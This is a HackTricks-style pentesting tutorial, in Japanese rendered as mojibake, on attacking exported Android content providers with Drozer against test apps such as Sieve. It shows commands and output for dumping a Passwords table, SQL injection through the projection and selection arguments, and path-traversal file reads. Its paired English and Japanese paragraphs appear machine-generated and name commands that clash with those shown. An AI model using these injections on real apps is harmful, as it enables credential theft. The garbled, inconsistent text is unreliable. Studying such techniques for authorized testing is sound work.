# ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ã®æ‚ªç”¨

## ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ã®æ‚ªç”¨

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## ã‚¤ãƒ³ãƒˆãƒ­

ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å¿œã˜ã¦ãƒ‡ãƒ¼ã‚¿ã‚’ä»–ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«æä¾›ã—ã¾ã™ã€‚ã“ã®ã‚ˆã†ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€ContentResolverã‚¯ãƒ©ã‚¹ã®ãƒ¡ã‚½ãƒƒãƒ‰ã«ã‚ˆã£ã¦å‡¦ç†ã•ã‚Œã¾ã™ã€‚ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ã¯ã€ãƒ‡ãƒ¼ã‚¿ã‚’**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**ã€**ãƒ•ã‚¡ã‚¤ãƒ«**ã€ã¾ãŸã¯**ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯**ä¸Šã«**ä¿å­˜**ã™ã‚‹ãŸã‚ã«ã•ã¾ã–ã¾ãªæ–¹æ³•ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ã¯_Manifest.xml_ãƒ•ã‚¡ã‚¤ãƒ«å†…ã§å®£è¨€ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ï¼š
```markup
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
ã“ã®å ´åˆã€`content://com.mwr.example.sieve.DBContentProvider/Keys` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã¯ `READ_KEYS` ã®è¨±å¯ãŒå¿…è¦ã§ã™ã€‚\
ï¼ˆã¾ãŸã€æ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ä¿è­·ã•ã‚Œã¦ã„ãªã„ `/Keys/` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹äºˆå®šã§ã™ãŒã€é–‹ç™ºè€…ãŒæ··ä¹±ã—ã¦ `/Keys` ã‚’ä¿è­·ã—ã¦ã—ã¾ã£ãŸãŸã‚ã§ã™ã€‚ï¼‰

**ãŠãã‚‰ãã€ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€ã„ãã¤ã‹ã®è„†å¼±æ€§ï¼ˆSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚„ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ï¼‰ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚**

## **å…¬é–‹ã•ã‚ŒãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€**ã‹ã‚‰æƒ…å ±ã‚’å–å¾—ã™ã‚‹
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
ç§ãŸã¡ã¯ã€DBContentProviderã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„URIã®ä¸€éƒ¨ã‚’**å†æ§‹ç¯‰**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãªãœãªã‚‰ã€ãã‚Œã‚‰ã¯å¿…ãšã€Œ_content://_ã€ã§å§‹ã¾ã‚Šã€DrozerãŒ_Path: /Keys_å†…ã§å–å¾—ã—ãŸæƒ…å ±ã‚’çŸ¥ã£ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚

Drozerã¯ã€è¤‡æ•°ã®URIã‚’**æ¨æ¸¬ã—ã¦è©¦ã™**ã“ã¨ãŒã§ãã¾ã™ã€‚
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
**ContentProviderã®ã‚³ãƒ¼ãƒ‰**ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€ã‚¯ã‚¨ãƒªã‚’æ¤œç´¢ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

ã¾ãŸã€å®Œå…¨ãªã‚¯ã‚¨ãƒªãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã¯ã€ContentProviderã§`onCreate`ãƒ¡ã‚½ãƒƒãƒ‰ã§å®£è¨€ã•ã‚Œã¦ã„ã‚‹åå‰ã‚’ãƒã‚§ãƒƒã‚¯ã§ãã¾ã™ï¼š

![](<../../../.gitbook/assets/image (186).png>)

ã‚¯ã‚¨ãƒªã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š`content://name.of.package.class/declared_name`

## **ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã¨ã™ã‚‹Content Provider**

ãŠãã‚‰ãã€ã»ã¨ã‚“ã©ã®Content Providerã¯**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**ã®**ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹**ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã¯æƒ…å ±ã‚’**æŠ½å‡ºã€æ›´æ–°ã€æŒ¿å…¥ã€å‰Šé™¤**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
**æ©Ÿå¯†æƒ…å ±ã«ã‚¢ã‚¯ã‚»ã‚¹**ã§ãã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã‹ã€**èªè¨¼**ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’**ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹ãŸã‚ã«å¤‰æ›´ã—ã¦ã¿ã¦ãã ã•ã„ã€‚

Content Providerã®ã‚³ãƒ¼ãƒ‰ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹éš›ã«ã¯ã€_queryã€insertã€updateã€delete_ãªã©ã®åå‰ã®**é–¢æ•°**ã‚‚ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼š

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

ã“ã‚Œã‚‰ã®é–¢æ•°ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã‚‹ã‹ã‚‰ã§ã™ã€‚

### ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®ã‚¯ã‚¨ãƒª
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®æŒ¿å…¥

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€**åˆ—ã®åå‰**ã‚’çŸ¥ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®å¾Œã€DBã«ãƒ‡ãƒ¼ã‚¿ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_æŒ¿å…¥ã¨æ›´æ–°ã§ã¯ã€--stringã‚’ä½¿ç”¨ã—ã¦æ–‡å­—åˆ—ã‚’æŒ‡å®šã—ã€--doubleã‚’ä½¿ç”¨ã—ã¦å€ç²¾åº¦æµ®å‹•å°æ•°ç‚¹æ•°ã‚’æŒ‡å®šã—ã€--floatã€--integerã€--longã€--shortã€--booleanã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚_

### ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®æ›´æ–°

åˆ—ã®åå‰ã‚’çŸ¥ã£ã¦ã„ã‚‹å ´åˆã€ã‚¨ãƒ³ãƒˆãƒªã‚’**å¤‰æ›´**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

![](<../../../.gitbook/assets/image (190).png>)

### ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®å‰Šé™¤

![](<../../../.gitbook/assets/image (191).png>)

### **SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**

ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ã«æ¸¡ã•ã‚Œã‚‹**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**ã¨**é¸æŠãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰**ã‚’æ“ä½œã™ã‚‹ã“ã¨ã§ã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**(SQLite)**ã‚’ç°¡å˜ã«ãƒ†ã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ã‚’ã‚¯ã‚¨ãƒªã™ã‚‹éš›ã«ã¯ã€æƒ…å ±ã‚’æ¤œç´¢ã™ã‚‹ãŸã‚ã®2ã¤ã®èˆˆå‘³æ·±ã„å¼•æ•°ãŒã‚ã‚Šã¾ã™: _--selection_ ã¨ _--projection_:

![](<../../../.gitbook/assets/image (192) (1).png>)

ã“ã‚Œã‚‰ã®**ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**ã‚’æ‚ªç”¨ã—ã¦ã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Drozerã«ã‚ˆã‚‹è‡ªå‹•SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®ç™ºè¦‹**

Drozer is an Android security assessment framework that allows you to find vulnerabilities in Android applications. One of the techniques it supports is automatic SQL injection discovery.

Drozerã¯ã€Androidã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã®Androidã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è©•ä¾¡ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã§ã™ã€‚ãã®ä¸­ã§ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã®ä¸€ã¤ãŒã€è‡ªå‹•SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®ç™ºè¦‹ã§ã™ã€‚

SQL injection is a common vulnerability in web applications, but it can also affect Android applications that use SQLite databases. By injecting malicious SQL queries, an attacker can manipulate the database and potentially gain unauthorized access to sensitive information.

SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãŠã‘ã‚‹ä¸€èˆ¬çš„ãªè„†å¼±æ€§ã§ã™ãŒã€SQLiteãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ä½¿ç”¨ã™ã‚‹Androidã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚‚å½±éŸ¿ã‚’ä¸ãˆã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€æ‚ªæ„ã®ã‚ã‚‹SQLã‚¯ã‚¨ãƒªã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã§ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’æ“ä½œã—ã€æ©Ÿå¯†æƒ…å ±ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¡Œã†å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

Drozer's SQL injection module automates the process of finding SQL injection vulnerabilities in Android applications. It does this by analyzing the application's content providers, which are components that allow data to be shared between different applications. By sending specially crafted queries to these content providers, Drozer can detect if the application is vulnerable to SQL injection attacks.

Drozerã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯ã€Androidã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãŠã‘ã‚‹SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’è‡ªå‹•çš„ã«è¦‹ã¤ã‘ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã‚’å®Ÿç¾ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ‡ãƒ¼ã‚¿ã‚’ç•°ãªã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³é–“ã§å…±æœ‰ã™ã‚‹ãŸã‚ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã‚ã‚‹ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ã‚’åˆ†æã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã¾ã™ã€‚ç‰¹åˆ¥ã«ä½œæˆã•ã‚ŒãŸã‚¯ã‚¨ãƒªã‚’ã“ã‚Œã‚‰ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ã«é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€Drozerã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã«å¯¾ã—ã¦è„†å¼±ã§ã‚ã‚‹ã‹ã©ã†ã‹ã‚’æ¤œå‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

To use Drozer's SQL injection module, you need to have a rooted Android device and the Drozer agent installed on it. Once you have set up the environment, you can use the `sqlinjection` command in Drozer to automatically scan an application for SQL injection vulnerabilities.

Drozerã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯ã€ãƒ«ãƒ¼ãƒˆåŒ–ã•ã‚ŒãŸAndroidãƒ‡ãƒã‚¤ã‚¹ã¨Drozerã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ãŒå¿…è¦ã§ã™ã€‚ç’°å¢ƒã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã—ãŸã‚‰ã€Drozerã®`sqlinjection`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’è‡ªå‹•çš„ã«ã‚¹ã‚­ãƒ£ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

It is important to note that the SQL injection module in Drozer is a powerful tool, but it should only be used on applications that you have permission to test. Using it on unauthorized applications can be illegal and unethical.

Drozerã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯å¼·åŠ›ãªãƒ„ãƒ¼ãƒ«ã§ã™ãŒã€ãƒ†ã‚¹ãƒˆã®è¨±å¯ã‚’å¾—ãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã®ã¿ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚è¨±å¯ã•ã‚Œã¦ã„ãªã„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ä½¿ç”¨ã™ã‚‹ã“ã¨ã¯é•æ³•ã§ã‚ã‚Šã€å€«ç†çš„ã«ã‚‚å•é¡ŒãŒã‚ã‚Šã¾ã™ã€‚
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã¨ã—ãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼**

ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚

![](<../../../.gitbook/assets/image (193).png>)

### ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚Š

ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‹ã‚‰ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«**

ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã€ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã“ã®å ´åˆã€å¿…è¦ã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€"_../_"ã‚„é¡ä¼¼ã®ãƒˆãƒªãƒƒã‚¯ã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™ï¼‰ã€‚
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Drozerã«ã‚ˆã‚‹è‡ªå‹•ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã®ç™ºè¦‹**

Drozer is an Android security assessment framework that allows us to perform various security tests on Android applications. One of the features of Drozer is the ability to automatically discover Path Traversal vulnerabilities in Android applications.

Drozerã¯ã€Androidã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦ã•ã¾ã–ã¾ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã‚‹Androidã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è©•ä¾¡ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã§ã™ã€‚Drozerã®ç‰¹å¾´ã®ä¸€ã¤ã¯ã€Androidã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«è„†å¼±æ€§ã‚’è‡ªå‹•çš„ã«ç™ºè¦‹ã™ã‚‹æ©Ÿèƒ½ã§ã™ã€‚

Path Traversal vulnerabilities occur when an application allows user-controlled input to be used in file or directory paths without proper validation. This can lead to unauthorized access to sensitive files or directories on the device.

ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«è„†å¼±æ€§ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒé©åˆ‡ãªæ¤œè¨¼ã‚’è¡Œã‚ãšã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒåˆ¶å¾¡å¯èƒ½ãªå…¥åŠ›ã‚’ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ãƒ‘ã‚¹ã«ä½¿ç”¨ã™ã‚‹å ´åˆã«ç™ºç”Ÿã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ‡ãƒã‚¤ã‚¹ä¸Šã®æ©Ÿå¯†ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã¸ã®ä¸æ­£ãªã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

To automatically discover Path Traversal vulnerabilities using Drozer, we can use the `path_traversal` module. This module sends various requests with different path traversal payloads to the target application and checks for any unexpected responses.

Drozerã‚’ä½¿ç”¨ã—ã¦ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«è„†å¼±æ€§ã‚’è‡ªå‹•çš„ã«ç™ºè¦‹ã™ã‚‹ã«ã¯ã€`path_traversal`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯ã€ã•ã¾ã–ã¾ãªãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å¯¾è±¡ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«é€ä¿¡ã—ã€äºˆæœŸã—ãªã„å¿œç­”ãŒã‚ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚

To use the `path_traversal` module, we need to first start a Drozer session with the target application. Once the session is established, we can run the `path_traversal` module using the `run` command.

